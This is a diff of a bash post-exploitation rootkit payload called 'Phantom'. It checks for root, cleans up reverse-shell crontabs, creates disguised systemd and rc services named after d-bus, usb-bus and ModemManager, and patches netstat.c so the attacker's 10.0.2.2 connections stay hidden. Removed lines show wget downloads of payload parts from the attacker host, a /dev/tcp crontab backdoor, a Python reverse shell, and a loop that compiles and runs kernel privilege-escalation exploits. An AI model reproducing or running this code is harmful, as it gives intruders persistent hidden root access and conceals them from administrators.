@@ -3,12 +3,43 @@
 ip="10.0.2.2"
 port2="9999"
 portp="15122"
-portr="15066"
 
-echo "---Phantom started---"
-#find the user making the connection
+source /tmp/.functions
+source /tmp/.rootkit
+source /tmp/.services
+source /tmp/.variables
+
+#check if priviledge escalation succeeded
 user=$(whoami)
-echo "user making the connection: $user"
+
+if [ "$user" != "root" ]; then
+  echo "priviledge escalation failed"
+  printf "removing files needed by payload... "
+  rm /tmp/.rootkit &>/dev/null
+  rm /tmp/.functions &>/dev/null
+  rm /tmp/.services &>/dev/null
+  rm /tmp/.variables &>/dev/null
+  rm -r /tmp/$ip:$portp &>/dev/null
+  finish
+  exit
+fi
+
+#---if the user making the connection is root---
+echo "priviledge escalation succeeded"
+echo "------------------------------------------------------"
+
+#remove user's crontab
+users=$(cat /etc/passwd | awk -F: '{ print $1 }')
+read -d + -a usernames <<< "$users"
+for (( i=0; i < ${#usernames[@]}; i=i+1 )); do
+  cron=$(crontab -u ${usernames[i]} -l 2>/dev/null)
+  expression=$(expr "$cron" : ".*/dev/tcp/$ip/$port2")
+  if [ "$expression" != '0' ]; then
+    printf "removing ${usernames[i]} crontab... "
+    crontab -u ${usernames[i]} -r 2>/dev/null
+    finish
+  fi
+done
 
 #find the distribution
 cat /proc/version | grep "Ubuntu" >/dev/null
@@ -25,73 +56,7 @@ else
     fi
   fi
 fi
-echo "linux distribution: $distro"
 
-#find the kernel version (needed for priv esc)
-version=$(uname -r)
-version=${version%%-*}
-major=${version%%\.*}
-minor=${version#*\.}
-minor=${minor%\.*}
-echo "kernel version: $version"
-
-#get the functions, variables and exploits needed by payload
-echo "--get needed functions and variables--"
-printf "get functions... "
-wget -q -O /tmp/.functions http://$ip:$portp/functions
-source /tmp/.functions
-finish
-printf "get rootkit... "
-wget -q -O /tmp/.rootkit http://$ip:$portp/rootkit
-source /tmp/.rootkit
-finish
-printf "get services... "
-wget -q -O /tmp/.services http://$ip:$portp/services
-source /tmp/.services
-finish
-printf "get variables... "
-wget -q -O /tmp/.variables http://$ip:$portp/variables
-source /tmp/.variables
-finish
-printf "get exploits... "
-wget -q -r -k -R "index.html*" -P /tmp /tmp http://$ip:$portp/exploits/
-chmod -R +x /tmp/$ip:$portp/exploits
-finish
-
-#if the user making the connection is not root add a crontab entry which spawns backdoor bash shells
-if [ "$user" != "root" ]; then
-  printf "adding crontab for $user... "
-  printf "* * * * * bash -c 'bash &>/dev/tcp/$ip/$port2 <&1 &'\n" >/tmp/.cron
-  crontab /tmp/.cron
-  finish
-  rm /tmp/.cron
-  echo "---attempt priviledge escalation---"
-  python_reverse=$(cat << EOF
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$portr));
-os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["bash"]);'
-EOF
-)
-  exploits_major_array=($(ls /tmp/$ip:$portp/exploits))
-  for i in $exploits_major_array; do
-    if [ $major -le $i ]; then
-      exploits_minor_array=($(ls /tmp/$ip:$portp/exploits/$i))
-      for j in $exploits_minor_array; do
-        if [ $minor -le $j ]; then
-          exploits_final_array=($(ls /tmp/$ip:$portp/exploits/$i/$j))
-          for k in $exploits_final_array; do
-            gcc -o /tmp/a.out -pthread /tmp/$ip:$portp/exploits/$i/$j/$k &>/dev/null
-            echo $python_reverse | /tmp/a.out &>/dev/null
-          done
-        fi
-      done
-    fi
-  done
-  rm /tmp/a.out
-  exit
-fi
-
-
-#---if the user making the connection is root---
 #--create the services--
 #check which kind of services management system is used
 ls /etc/systemd &>/dev/null
@@ -105,6 +70,23 @@ if [ "$?" == "0" ]; then
   create_script "$d_bus_bash_script" "/usr/local/share/d-bus/d-bus"
   create_systemd_service "$d_bus_systemd_service" "dbus-org.freedesktop.ModemManager11.service"
 else
+  : '
+  #create the rc scripts and services
+  echo "--create the rc scripts and services--"
+  #usb-bus service
+  mkdir /var/lib/usb-bus 2>/dev/null
+  create_script "$usb_bus_script" "/var/lib/usb-bus/usb-bus"
+  create_script "$rc_usb_bus_systemd_service" "/etc/init.d/usb-bus"
+  create_rc_service "/etc/init.d/usb-bus" "usb-bus"
+  #printf "running update-rc.d for the usb-bus service... "
+  #update-rc.d usb-bus defaults &>/dev/null
+  #finish
+  #d-bus service
+  mkdir /usr/local/share/d-bus 2>/dev/null
+  create_script "$d_bus_python_script" "/usr/local/share/d-bus/d-bus"
+  #create_script "$rc_python_service" "/etc/init.d/d-bus"
+  #create_rc_service "/etc/init.d/d-bus" "S91d-bus"
+  '
   #create the crontab file
   echo "--create the scripts and root crontab file--"
   mkdir /var/lib/usb-bus 2>/dev/null
@@ -260,7 +242,7 @@ if [ "$?" == "0" ]; then
   rm /tmp/net-tools.zip
   #modify netstat.c
   printf "modifying netstat.c... "
-  sed -i "s/printf(\"%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, \"$ip:$port2\") == 0 ) {\n\t\tprintf(\"%-4s  %6ld %6ld %-*s/" /tmp/net-tools-master/netstat.c 2>/dev/null
+  sed -i "s/printf(\"%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, \"$ip:$port\") == 0 ) {\n\t\tprintf(\"%-4s  %6ld %6ld %-*s/" /tmp/net-tools-master/netstat.c 2>/dev/null
   sed -i '0,/finish_this_one(uid,inode,timers);/{s/finish_this_one(uid,inode,timers);/\tfinish_this_one(uid,inode,timers);\n\t}/};' /tmp/net-tools-master/netstat.c 2>/dev/null
   finish
   #patch the makefile
